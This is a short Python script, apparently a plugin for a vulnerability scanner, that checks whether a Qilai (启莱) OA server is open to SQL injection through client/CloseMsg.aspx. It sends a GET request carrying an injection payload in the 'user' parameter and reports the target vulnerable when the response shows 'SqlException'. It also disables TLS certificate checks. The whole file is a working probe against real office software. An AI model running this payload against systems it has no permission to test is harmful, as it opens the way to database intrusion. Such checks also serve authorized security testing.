import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 启莱OA_closeMsg_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    vuln_url = urldata + "client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1"
    try:
        requests.packages.urllib3.disable_warnings()
        respones = requests.get(vuln_url, headers=headers, verify=False)
        if "SqlException" in respones.text:
            print(Vcolors.RED + "[+] 启莱OA CloseMsg.aspx SQL注入漏洞 存在{}".format(vuln_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 启莱OA CloseMsg.aspx SQL注入漏洞不存在" + Vcolors.ENDC)

    except:
            logging.error("启莱OA_closeMsg_sql脚本出现异常")

